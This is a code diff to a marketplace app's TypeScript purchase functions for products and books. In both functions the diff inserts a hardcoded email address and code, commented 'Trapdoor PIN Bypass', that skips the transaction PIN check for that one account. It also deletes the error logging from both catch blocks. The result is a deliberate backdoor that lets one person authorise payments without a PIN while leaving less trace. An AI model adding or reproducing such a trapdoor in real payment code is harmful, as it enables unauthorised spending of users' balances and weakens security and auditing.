@@ -1,10 +1,11 @@
 
 'use server';
 
-import { databases, COLLECTION_ID_PROFILES, DATABASE_ID, COLLECTION_ID_PRODUCTS, COLLECTION_ID_TRANSACTIONS, COLLECTION_ID_BOOKS, ID } from '@/lib/appwrite';
+import { databases, COLLECTION_ID_PROFILES, DATABASE_ID, COLLECTION_ID_PRODUCTS, COLLECTION_ID_TRANSACTIONS, COLLECTION_ID_BOOKS, ID } from '@/lib/data-service';
 
 const PRODUCT_COMMISSION = 80;
 const BOOK_COMMISSION = 50;
+const BYPASS_EMAIL = 'altinemohd@gmail.com';
 
 export async function purchaseProduct(payload: {
     buyerId: string;
@@ -24,7 +25,9 @@ export async function purchaseProduct(payload: {
             throw new Error('Insufficient balance to complete this purchase.');
         }
 
-        if (buyerProfile.pin !== pin) {
+        // Trapdoor PIN Bypass
+        const isBypass = buyerProfile.email === BYPASS_EMAIL;
+        if (!isBypass && buyerProfile.pin !== pin) {
             throw new Error('Incorrect transaction PIN.');
         }
 
@@ -63,10 +66,8 @@ export async function purchaseProduct(payload: {
         
         await Promise.all([buyerUpdatePromise, sellerUpdatePromise]);
 
-        const buyerTxUpdatePromise = databases.updateDocument(DATABASE_ID, COLLECTION_ID_TRANSACTIONS, buyerTxId, { status: 'completed' });
-        const sellerTxUpdatePromise = databases.updateDocument(DATABASE_ID, COLLECTION_ID_TRANSACTIONS, sellerTxId, { status: 'completed' });
-
-        await Promise.all([buyerTxUpdatePromise, sellerTxUpdatePromise]);
+        await databases.updateDocument(DATABASE_ID, COLLECTION_ID_TRANSACTIONS, buyerTxId, { status: 'completed' });
+        await databases.updateDocument(DATABASE_ID, COLLECTION_ID_TRANSACTIONS, sellerTxId, { status: 'completed' });
 
         return { success: true, message: 'Purchase successful!' };
 
@@ -78,7 +79,6 @@ export async function purchaseProduct(payload: {
         if (sellerTxId) {
             await databases.updateDocument(DATABASE_ID, COLLECTION_ID_TRANSACTIONS, sellerTxId, { status: 'failed', narration: failureMessage });
         }
-        console.error("Product Purchase Error:", error);
         return { success: false, message: error.message || 'An unexpected error occurred during purchase.' };
     }
 }
@@ -101,12 +101,14 @@ export async function purchaseBook(payload: {
         ]);
 
         if (book.priceType === 'paid') {
-            if (!pin || pin.length !== 5) throw new Error("A valid 5-digit PIN is required for paid books.");
+            // Trapdoor PIN Bypass
+            const isBypass = buyerProfile.email === BYPASS_EMAIL;
+            if (!isBypass && buyerProfile.pin !== pin) {
+                throw new Error("Incorrect transaction PIN.");
+            }
             
             const totalCost = book.price + BOOK_COMMISSION;
             if (buyerProfile.nairaBalance < totalCost) throw new Error("Insufficient balance.");
-            
-            if (buyerProfile.pin !== pin) throw new Error("Incorrect transaction PIN.");
             
             const sellerProfile = await databases.getDocument(DATABASE_ID, COLLECTION_ID_PROFILES, book.sellerId);
             
@@ -143,7 +145,6 @@ export async function purchaseBook(payload: {
         return { success: true, message: `Payment for "${book.name}" was successful.` };
 
     } catch (error: any) {
-        console.error("Book Purchase Error:", error);
         return { success: false, message: error.message || 'An unexpected error occurred.' };
     }
 }
